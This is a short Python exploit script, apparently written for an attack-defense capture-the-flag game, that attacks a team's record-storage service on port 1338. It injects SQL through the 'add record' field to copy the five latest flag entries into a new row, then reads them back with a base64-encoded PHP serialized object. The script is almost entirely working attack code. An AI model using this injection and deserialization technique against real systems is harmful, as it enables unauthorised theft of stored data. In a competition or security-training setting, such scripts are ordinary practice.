#!/usr/bin/python2
import sys
import pwn
import uuid
import base64
queryid = uuid.uuid4().hex.upper()[0:6]

team_ip= sys.argv[1]
team_port = 1338

def pwn_store_record(p, pwnstring):
    p.readuntil('What do you want to do? ')
    p.sendline('2')
    p.readuntil('record to add: ')
    p.sendline(pwnstring)

def pwn_retrive_record(p, pwnstring):
    p.readuntil('What do you want to do? ')
    p.sendline('3')
    p.readuntil('identifier: ')
    p.sendline(pwnstring)
#    p.interactive()
    p.readuntil('you are: ')
    flag = p.readline().split(",")[0]

    return flag

def pwn_exit(p):
    p.readuntil('What do you want to do? ')
    p.sendline('4')


pwnstring = "1', 0); insert into record values ('"+ queryid +"', (select GROUP_CONCAT(record, ',') from record where record like 'FLG%' order by time desc limit 5),1)--"

p = pwn.remote(team_ip, team_port)
#p = pwn.process('troll.php')

record_b64 = base64.b64encode('a:1:{i:0;O:6:"Record":1:{s:10:"identifier";s:6:"' + queryid + '";}}').encode('utf-8')
# print(record_b64)

pwn_store_record(p, pwnstring)
print(pwn_retrive_record(p, record_b64))

pwn_exit(p)
